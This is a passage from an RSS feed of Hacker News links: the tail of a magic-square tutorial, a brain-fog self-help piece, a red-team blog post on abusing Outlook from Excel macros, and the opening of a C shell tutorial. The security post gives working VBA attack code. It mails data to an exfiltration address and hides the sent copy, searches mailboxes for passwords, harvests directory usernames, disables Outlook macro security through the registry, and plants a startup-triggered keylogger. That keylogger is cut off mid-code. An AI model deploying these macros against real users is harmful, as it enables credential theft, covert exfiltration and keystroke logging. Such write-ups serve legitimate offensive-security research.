</pre></div></span></p><p>Once we run this code, we notice a massive improvement in performance! Within only a couple of seconds, our algorithm actually finds multiple squares.</p><p>With this new algorithm, we skip all squares which repeat numbers, which will always be invalid. So, we are looping through all permutations. We can expect to run the validation function about $P(10, 9) = 3,628,800$ times, which is much less than the $9^9$ times we had to check last time.</p><p>Now, this method speeds up our code, but by how much? Theoretically, it takes $P(10, 9) * 1.6 \mu\textrm{s} \sim 5.8 \mu\textrm{s}$ to just run all the validations. (We introduced a bunch of ‚Äòif‚Äô statements in between each of the for loops, so it will take a bit longer in reality.) But the point is, our new algorithm works $10,600\%$ faster than the old one!</p><h2>Using a While Loop</h2><p>Still, we have another problem left, and that is the quality of the code. No one wants to have to look at a cascading abyss of for loops and if statements while writing their code, so let‚Äôs see if we can combine all this into a single while loop.</p><p>If you think about it, we can treat the square as a list of numbers instead of a list of rows. Instead of $[[1, 2, 3], [4, 5, 6], [7, 8, 9]],$ we can store the array as $[1, 2, 3, 4, 5, 6, 7, 8, 9].$ Now, that means we will need a function to convert the flat list into a square:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>arr_to_square</span>(arr):
    side_length <span>=</span> <span>int</span>(<span>len</span>(arr) <span>**</span> <span>0.5</span>)
    <span>return</span> [arr[i:i<span>+</span>side_length] <span>for</span> i <span>in</span> <span>range</span>(<span>0</span>, <span>len</span>(arr), side_length)]
</pre></div></span></p><p>Now, let‚Äôs think of how we can structure the while loop. We want the loop to keep going until both the value None is nowhere to be found in the list, and the square is valid. We can use the <code>or</code> operator to run the loop if <code>None</code> is in the square, or the square isn‚Äôt valid, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>(size):
    n <span>=</span> get_magic_const(size)
    square <span>=</span> [<span>None</span> <span>for</span> i <span>in</span> <span>range</span>(size<span>**</span><span>2</span>)]
    
    <span>while</span> <span>None</span> <span>in</span> square <span>or</span> <span>not</span> is_valid(arr_to_square(square), n):
        <span>pass</span>
        
    <span>return</span> arr_to_square(square)
</pre></div></span></p><p>You‚Äôll notice I use the function <code>get_magic_const</code>, which computes the magic constant, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>get_magic_const</span>(side_length):
    <span>return</span> side_length<span>*</span>(side_length<span>**</span><span>2</span><span>+</span><span>1</span>)<span>/</span><span>2</span>
</pre></div></span></p><p>We will need a variable to store the index of the ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.eurisko.us/solving-magic-squares-using-backtracking/">http://www.eurisko.us/solving-magic-squares-using-backtracking/</a></em></p>]]>
            </description>
            <link>http://www.eurisko.us/solving-magic-squares-using-backtracking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126652</guid>
            <pubDate>Sat, 13 Feb 2021 20:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategies to Reduce Brain Fog and Improve Clear Thinking]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 90 (<a href="https://news.ycombinator.com/item?id=26126401">thread link</a>) | @evo_9
<br/>
February 13, 2021 | https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/ | <a href="https://web.archive.org/web/*/https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><div><hr>
<p>Mental fog is often described as a ‚Äúcloudy-headed‚Äù feeling.</p>
<p>Common conditions of brain fog include poor memory, difficulty focusing or concentrating, and struggling with articulation.</p>
<p>Imagine if you could concentrate your brain power into one bright beam and focus it like a laser on whatever you wish to accomplish.</p>
<p>Many people struggle to concentrate. And when you can‚Äôt concentrate, everything you do is harder and takes longer than you‚Äôd like.</p>
<h3><strong>Give up the&nbsp;clutter</strong></h3>
<p>Mess creates stress.</p>
<p>There‚Äôs a strong link between your physical space and your mental space.</p>
<p>Clutter is bad for your mind and health. It can create long-term, low-level anxiety.</p>
<p>When the book, <a rel="nofollow" href="https://amzn.to/2tvOPr0" data-href="http://amzn.to/2tvOPr0" target="_blank"><em>The Japanese Art of Reorganizing and Decluttering</em></a><em>,</em> by Marie Condo became a best-seller, it wasn‚Äôt too surprising.</p>
<p>We are all looking for ways to create more meaningful lives with less to distract us.</p>
<blockquote><p><strong><em>Get rid of clutter at your office, on your desk, in your room, and you will send a clear message of calm directly to your brain.</em></strong></p></blockquote>
<p>Start decluttering today in small, focused bursts. You‚Äôre not going to clean up your entire space in a day, so start small to make it a daily habit that sticks.</p>
<p>Set yourself up for success by making a plan and targeting specific areas you‚Äôre going to declutter, clean up, and organize over a prolonged period of time.</p>
<h3>Multi-tasking doesn‚Äôt&nbsp;work</h3>
<p>The ability to multi-task is a false badge of honor.</p>
<p>Task switching has a severe cost.</p>
<p>Your concentration suffers when you multitask.</p>
<p>It compromises how much actual time you spend doing productive work, because you‚Äôre continually unloading and reloading the hippocampus/short term memory.</p>
<p>Research shows that tasks switching actually burns more calories and fatigues your brain ‚Äì reducing your overall capacity for productive thought and work.</p>
<p>Commit to completing one task at a time.</p>
<p>Remove potential distractions (like silencing your mobile, turning off email alerts ) before you start deep work to avoid the temptation to switch between tasks.</p>
<p><strong>Use the 3-to-1 method!</strong></p>
<p>Narrow down your most important tasks to 3, and then give one task your undivided attention for a period of time.</p>
<p>Allow yourself to rotate between the three, giving yourself a good balance of singular focus and variety.</p>
<h3>Give up the urgent distraction</h3>
<p>Disconnect. Your productivity, creativity and next big idea depends on it.</p>
<p>Urgency wrecks productivity. Urgent but unimportant tasks are major distractions.</p>
<p>Last-minute distractions are not necessarily priorities.</p>
<p>Sometimes important tasks stare you right in the face, but you neglect them and respond to urgent but unimportant things.</p>
<p>You need to reverse that. It‚Äôs one the only ways to master your time.</p>
<blockquote><p><strong><em>Your ability to distinguish urgent and important tasks has a lot to do with your success.</em></strong></p></blockquote>
<p>Important tasks are things that contribute to your long-term mission, values, and goals. Separating these differences is simple enough to do once, but doing so continually can be tough.</p>
<h3>Stop feeding your&nbsp;comfort</h3>
<p>Comfort provides a state of mental security.</p>
<p>When you‚Äôre comfortable and life is good, your brain can release chemicals like dopamine and serotonin, which lead to happy feelings.</p>
<p>But in the long-term, comfort is bad for your brain.</p>
<blockquote><p><strong><em>Without mental stimulation dendrites, connections between brain neurons that keep information flowing, shrink or disappear altogether.</em></strong></p></blockquote>
<p>An active life increases dendrite networks and also increase the brain‚Äôs regenerating capacity, known as plasticity.</p>
<p>‚ÄúNeglect of intense learning leads plasticity systems to waste away,‚Äù says Norman Doidge in his book, <a rel="nofollow" href="https://amzn.to/2Fnh3to" data-href="http://amzn.to/2Fnh3to" target="_blank">The Brain That Changes Itself</a>.</p>
<p>Michael Merzenich, a pioneer of plasticity research, and author of <a rel="nofollow" href="https://amzn.to/2oXkPj3" data-href="http://amzn.to/2oXkPj3" target="_blank">Soft-wired: How the New Science of Brain Plasticity Can Change Your Life</a> says that going beyond the familiar is essential to brain health.</p>
<p>‚ÄúIt‚Äôs the willingness to leave the comfort zone that is the key to keeping the brain new,‚Äù he says.</p>
<p>Seeking new experiences, learning new skills, and opening the door to new ideas inspire us and educate us in a way improves mental clarity.</p>
<h3>Don‚Äôt sit&nbsp;still</h3>
<p>Sitting still all day, every day, is dangerous.</p>
<p>Love it or hate it, physical activity can have potent effects on your brain and mood.</p>
<blockquote><p><strong><em>The brain is often described as being ‚Äúlike a muscle‚Äù. Its needs to be exercised for better performance.</em></strong></p></blockquote>
<p>Research shows that moving your body can improve your cognitive function.</p>
<p>30‚Äì45 minutes of brisk walking, three times a week, can help fend off the mental wear and tear.</p>
<p>What you do with your body impinges on your mental faculties.</p>
<p>Find something you enjoy, then get up and do it. And most importantly, make it a habit.</p>
<h3>Stop consuming media and start creating&nbsp;instead</h3>
<p>It‚Äôs extremely easy to consume content.</p>
<p>You are passive. Even relaxed.</p>
<p>But for each piece of unlimited content you consume, it stops a piece of content you could have created.</p>
<p>Limit your mass media consumption.</p>
<p>Embrace the creation habit.</p>
<p>Start paying attention to the noise that you let seep into your eyes and ears.</p>
<p>Ask, Is this benefitting my life in any way?</p>
<p>Does all this information make me more prone to act?</p>
<p>Does it really make me more efficient? Does it move me forward in any significant way?</p>
<p><strong>Let creation determine consumption.</strong></p>
<p>Allow curiosity to lead you to discover and pursue something you deepy care about. Make time to create something unique.</p>
<p>The point is to get lost in awe and wonder like you did when you were a child. When you achieve that feeling from a certain activity, keep doing it!</p>
<p>Share your authentic self with the rest of us.</p>
<h4>Before you&nbsp;go‚Ä¶</h4>
<p>If you enjoyed this post, you will love <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Postanly Weekly</a> (my free digest of the best productivity, behaviour change, and neuroscience posts). <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Subscribe</a> and get a free copy of my new book, ‚Äú<em>The Power of One Percent Better: Small Gains, Maximum Results‚Äù. </em>Join over 40,000 people on a mission to build a better life.</p>
<p><em>Originally published at <a rel="nofollow" href="https://medium.com/personal-growth/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately-1bfee44f4dd7">medium.com</a></em></p>
</div></div></div>]]>
            </description>
            <link>https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126401</guid>
            <pubDate>Sat, 13 Feb 2021 20:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst of the two worlds: Excel meets Outlook]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 175 (<a href="https://news.ycombinator.com/item?id=26126067">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://adepts.of0x.cc/vba-outlook/ | <a href="https://web.archive.org/web/*/https://adepts.of0x.cc/vba-outlook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today‚Äôs homily is the last chapter of our trilogy about our epistolary-daemonic relationship with VBA. This time we are going to talk about how to interact with Outlook from Excel using macros, and also we are going to release a <strong>PoC where we turn Outlook into a keylogger</strong>. Please, take a seat and listen to the story.</p>  <p><em>We promise this is the last time <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a> will publish about VBA. We have scheduled an exorcism this weekend to release his daemons, so he can write again about vulnerabilities and other stuff different to VBA.</em></p>  <p>In our first chapter we talked about the concept of <a href="https://adepts.of0x.cc/kerberoast-vba-macro/">‚ÄúHacking in a epistolary way‚Äù</a>, where we started to implement attacks and TTPs directly in VBA macros avoiding process injections, dropping binaries or calling external programs that are flagged (like Powershell). This time we are going to shift our focus to Outlook.</p> <p>First of all we have to say that you can interact with Outlook directly from other Microsoft Office apps via VBA using the object <code>Outlook.Application</code>. This means that we can abuse Outlook functionalities from within Excel, so we can look for confidential information inside the inbox or we can exfiltrate data via mails. To send a mail only a few lines are needed:</p> <div><div><pre><code><span>'https://docs.microsoft.com/es-es/office/vba/api/outlook.namespace</span>
<span>Sub</span> <span>send_mail_example</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>xOutApp</span><span>.</span><span>CreateItem</span><span>(</span><span>0</span><span>)</span>
    <span>xMailBody</span> <span>=</span> <span>"You did it!"</span>
    <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>
    <span>With</span> <span>xOutMail</span>
        <span>.</span><span>To</span> <span>=</span> <span>"exfiltration.inbox@not-phising.cc"</span>
        <span>.</span><span>CC</span> <span>=</span> <span>""</span>
        <span>.</span><span>BCC</span> <span>=</span> <span>""</span>
        <span>.</span><span>Subject</span> <span>=</span> <span>"Macro executed "</span> <span>&amp;</span> <span>Environ</span><span>(</span><span>"username"</span><span>)</span>
        <span>.</span><span>Body</span> <span>=</span> <span>xMailBody</span>
        <span>.</span><span>Send</span>  
    <span>End</span> <span>With</span>
    <span>On</span> <span>Error</span> <span>GoTo</span> <span>0</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>If we do not want a copy in the ‚ÄúSent‚Äù folder we can set the property <code>DeleteAfterSubmit</code> as <em>True</em> after we set the <code>Body</code>. This will move directly the mail to the Deleted folder, so it is a bit more stealthy. To fully erradicate the mail we need to locate the mail (as item) inside the Deleted folder and then call the method <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.items.remove"><code>Remove</code></a> via MAPI.</p>  <p>The object <code>Outlook.Application</code> gives us also access to the namespace <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.application.getnamespace">MAPI</a> and all its methods. This is important because we can interact with the mail boxes without knowing the credentials. For example, we can use our macro to search all the received mails that contains the word ‚Äúpassword‚Äù in its body:</p> <div><div><pre><code><span>Sub</span> <span>retrieve_passwords</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>

    <span>Set</span> <span>myTasks</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetDefaultFolder</span><span>(</span><span>6</span><span>).</span><span>Items</span>
    <span>Dim</span> <span>i</span> <span>As</span> <span>Integer</span>
    <span>i</span> <span>=</span> <span>1</span>
    <span>For</span> <span>Each</span> <span>olMail</span> <span>In</span> <span>myTasks</span>
        <span>If</span> <span>(</span><span>InStr</span><span>(</span><span>1</span><span>,</span> <span>UCase</span><span>(</span><span>olMail</span><span>.</span><span>Body</span><span>),</span> <span>"PASSWORD"</span><span>,</span> <span>vbTextCompare</span><span>)</span> <span>&gt;</span> <span>0</span><span>)</span> <span>Then</span>
            <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>olMail</span><span>.</span><span>Body</span> <span>' Here we are just showing the info in the Excel sheets, but you can exfiltrate it as we saw before ;D</span>
            <span>i</span> <span>=</span> <span>i</span> <span>+</span> <span>1</span>
        <span>End</span> <span>If</span>
    <span>Next</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>Plaintext passwords inside mailboxes are probably one of the most common sins we are used to see in our engagements. A macro of this kind aimed to the right target can give you the Heaven‚Äôs keys.</p> <p>Another interesting information that we can get using MAPI is the Global Address List (GAL). In the address list we can find names, usernames, phone numbers, etc. Here we are just collecting usernames:</p> <div><div><pre><code><span>'https://www.excelcise.org/extract-outlook-global-address-list-details-with-vba/</span>
<span>Sub</span> <span>global_address_list</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>
    <span>Set</span> <span>outlGAL</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetGlobalAddressList</span><span>()</span>
    <span>Set</span> <span>outlEntry</span> <span>=</span> <span>outlGAL</span><span>.</span><span>AddressEntries</span>
        <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>

    <span>'loop through address entries and extract details</span>
    <span>For</span> <span>i</span> <span>=</span> <span>1</span> <span>To</span> <span>outlEntry</span><span>.</span><span>Count</span>
        <span>Set</span> <span>outlMember</span> <span>=</span> <span>outlEntry</span><span>.</span><span>Item</span><span>(</span><span>i</span><span>)</span>
        <span>If</span> <span>outlMember</span><span>.</span><span>AddressEntryUserType</span> <span>=</span> <span>olExchangeUserAddressEntry</span> <span>Then</span>
           <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>outlMember</span><span>.</span><span>GetExchangeUser</span><span>.</span><span>Name</span>  
        <span>End</span> <span>If</span>
    <span>Next</span> <span>i</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>The main issue is that retrieving this information <strong>can take a really long time</strong> if the company is big (we are talking about ~5-10 minutes), so it is a bit unpractical to be used in a real scenario. However both approaches can be executed <strong>inside</strong> Outlook via OTM files as we will see below.</p>  <p>In the last years various persistence methods related to Outlook were released and implemented in the tool <strong><a href="https://github.com/sensepost/ruler">Ruler</a></strong>. These methods were based on the execution of VBA code via <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/">Custom Forms</a> and <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/">Home Pages</a>. Both attacks are now patched, so we have to move forward.</p> <p>Recently <a href="https://twitter.com/domchell">Dominic Chell</a> published the article <a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a> where the persistence is achieved dropping a <strong>VbaProject.OTM</strong> file that is later loaded by Outlook. This is the path that we choosed here. But instead of using a payload to get a shell or parasite a process with our C2, we are going to create a keylogger in pure VBA <strong>:)</strong>.</p> <p>Outlook is one of the long term alive programs in an average office computer. It is launched since the workday beginning and is not closed until the worker leaves the office, so makes sense to use it as a keylogger. The plan is quite simple: we need to build an Excel file that modifies the registry (so Outlook can execute macros freely) and drops the OTM file with our keylogger.</p> <p>As the registry key is under <code>HKEY_CURRENT_USER</code> we do not need special privileges to modify the value (by default it is set at level 3 <em>Notifications for digitally signed macros, all other macros disabled</em>) so we enable the load and execution of macros by changing the value to 1 (<em>Enable all Macros</em>):</p> <div><div><pre><code><span>Sub</span> <span>disable_macro_security</span><span>()</span>
  <span>Dim</span> <span>myWS</span> <span>As</span> <span>Object</span>
  <span>Set</span> <span>myWS</span> <span>=</span> <span>VBA</span><span>.</span><span>CreateObject</span><span>(</span><span>"WScript.Shell"</span><span>)</span>
  <span>Dim</span> <span>name</span> <span>As</span> <span>String</span><span>,</span> <span>value</span> <span>As</span> <span>Integer</span><span>,</span> <span>stype</span> <span>As</span> <span>String</span>
  <span>name</span> <span>=</span> <span>"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span> <span>&amp;</span> <span>Application</span><span>.</span><span>Version</span> <span>&amp;</span> <span>"\Outlook\Security\Level"</span>
  <span>value</span> <span>=</span> <span>1</span>
  <span>stype</span> <span>=</span> <span>"REG_DWORD"</span>
  <span>myWS</span><span>.</span><span>RegWrite</span> <span>name</span><span>,</span> <span>value</span><span>,</span> <span>stype</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We use the Excel version (<code>Application.Version</code>) to calculate the right location of the key to be modified. After that the OTM file can be dropped to <code>Environ("appdata") &amp; "\Microsoft\Outlook\VbaProject.OTM"</code> (it can be packed inside a resource, form, or taken directly from internet and then read/unpack and dropped). It is nothing new, all the good ol‚Äô techniques to drop files apply here, let‚Äôs move to the OTM contents and the keylogger.</p> <p>For our keylogger we are going to use the function <strong><code>NtUserGetRawInputData</code></strong> that is not documented in the MSDN. But as usual: if something is not covered by Microsoft, go and check ReactOS. Luckily it is <a href="https://doxygen.reactos.org/d0/dc0/ntstubs_8c.html#ad041c37a6375f9be19cac8f4636d468e">documented</a>:</p> <div><div><pre><code><span>DWORD</span> <span>APIENTRY</span> <span>NtUserGetRawInputData</span> 	<span>(</span> 	<span>HRAWINPUT</span>  	<span>hRawInput</span><span>,</span>
		<span>UINT</span>  	<span>uiCommand</span><span>,</span>
		<span>LPVOID</span>  	<span>pData</span><span>,</span>
		<span>PUINT</span>  	<span>pcbSize</span><span>,</span>
		<span>UINT</span>  	<span>cbSizeHeader</span> 
	<span>)</span> 	
</code></pre></div></div> <p>Also we can see that it is exported by <a href="https://strontic.github.io/xcyclopedia/library/win32u.dll-7D649393F89A9DE3058162F8442130BC.html#win32udll">win32u.dll</a>, so our definition in VBA will be:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHeader</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>LongLong</span>
</code></pre></div></div> <p>Our approach will be the well-known technique of creating a window with a callback to snoop messages until we get a <code>WM_INPUT</code> and then use <code>NtUserGetRawInputData</code> to get the input data. To build the structures correctly (like <code>RAWKEYBOARD</code>) we can use <strong><code>offsetof</code></strong> as we described in our article <a href="https://adepts.of0x.cc/vba-tools/">Shedding light on creating VBA macros</a>, so we can check the size of each field and pick VBA types accordingly.</p> <p>Our macro has to be split in two parts</p> <ol> <li>The default module <code>ThisOutlookSession</code></li> <li>Another module created by us that we will rename to <code>Keylogger</code>.</li> </ol> <p>In <code>ThisOutlookSession</code> we only place the trigger that will execute our payload when Outlook starts:</p> <div><div><pre><code><span>Sub</span> <span>Application_Startup</span><span>()</span>
   <span>Keylogger</span><span>.</span><span>launcher</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We need to place the ‚Äúreal‚Äù payload inside another module to be allowed to use the operator <strong><a href="https://docs.microsoft.com/es-es/office/vba/language/reference/user-interface-help/invalid-use-of-addressof-operator">AddressOf</a></strong>, because we use it to set the callback to our window class. The <code>Keylogger</code> module code (remember: <strong>this is just a PoC</strong> that does not handle errors/exceptions, the intention of this code is just to exemplify how to build one):</p> <div><div><pre><code><span>'This can be hidden using DispCallFunc trick</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterClassEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"RegisterClassExA"</span> <span>(</span><span>pcWndClassEx</span> <span>As</span> <span>WNDCLASSEX</span><span>)</span> <span>As</span> <span>Integer</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>CreateWindowEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"CreateWindowExA"</span> <span>(</span><span>ByVal</span> <span>dwExStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>lpClassName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>lpWindowName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>dwStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>x</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>y</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nWidth</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nHeight</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>hWndParent</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hMenu</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hInstance</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DefWindowProc</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DefWindowProcA"</span> <span>(</span><span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsg</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wParam</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"GetMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>,</span> <span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMin</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMax</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>TranslateMessage</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DispatchMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DispatchMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetModuleHandle</span> <span>Lib</span> <span>"kernel32"</span> <span>Alias</span> <span>"GetModuleHandleA"</span> <span>(</span><span>ByVal</span> <span>lpModuleName</span> <span>As</span> <span>String</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterRawInputDevices</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>ByRef</span> <span>pRawInputDevices</span> <span>As</span> <span>RAWINPUTDEVICE</span><span>,</span> <span>ByVal</span> <span>uiNumDevices</span> <span>As</span> <span>Integer</span><span>,</span> <span>ByVal</span> <span>cbSize</span> <span>As</span> <span>Integer</span><span>)</span> <span>As</span> <span>Boolean</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHead‚Ä¶</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adepts.of0x.cc/vba-outlook/">https://adepts.of0x.cc/vba-outlook/</a></em></p>]]>
            </description>
            <link>https://adepts.of0x.cc/vba-outlook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126067</guid>
            <pubDate>Sat, 13 Feb 2021 19:35:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial ‚Äì Write a Shell in C]]>
            </title>
            <description>
<![CDATA[
Score 209 | Comments 48 (<a href="https://news.ycombinator.com/item?id=26126010">thread link</a>) | @mindcrime
<br/>
February 13, 2021 | https://brennan.io/2015/01/16/write-a-shell-in-c/ | <a href="https://web.archive.org/web/*/https://brennan.io/2015/01/16/write-a-shell-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan ‚Ä¢ 16 January 2015</em></p><p>It‚Äôs easy to view yourself as ‚Äúnot a <em>real</em> programmer.‚Äù  There are programs out
there that everyone uses, and it‚Äôs easy to put their developers on a pedestal.
Although developing large software projects isn‚Äôt easy, many times the basic
idea of that software is quite simple.  Implementing it yourself is a fun way to
show that you have what it takes to be a real programmer.  So, this is a
walkthrough on how I wrote my own simplistic Unix shell in C, in the hopes that
it makes other people feel that way too.</p>

<p>The code for the shell described here, dubbed <code>lsh</code>, is available on
<a href="https://github.com/brenns10/lsh">GitHub</a>.</p>

<p><strong>University students beware!</strong> Many classes have assignments that ask you to
write a shell, and some faculty are aware of this tutorial and code.  If you‚Äôre
a student in such a class, you shouldn‚Äôt copy (or copy then modify) this code
without permission.  And even then, I would <a href="https://brennan.io/2016/03/29/dishonesty/">advise</a> against heavily relying on this tutorial.</p>

<h2 id="basic-lifetime-of-a-shell">Basic lifetime of a shell</h2>

<p>Let‚Äôs look at a shell from the top down.  A shell does three main things in its
lifetime.</p>

<ul>
  <li><strong>Initialize</strong>: In this step, a typical shell would read and execute its
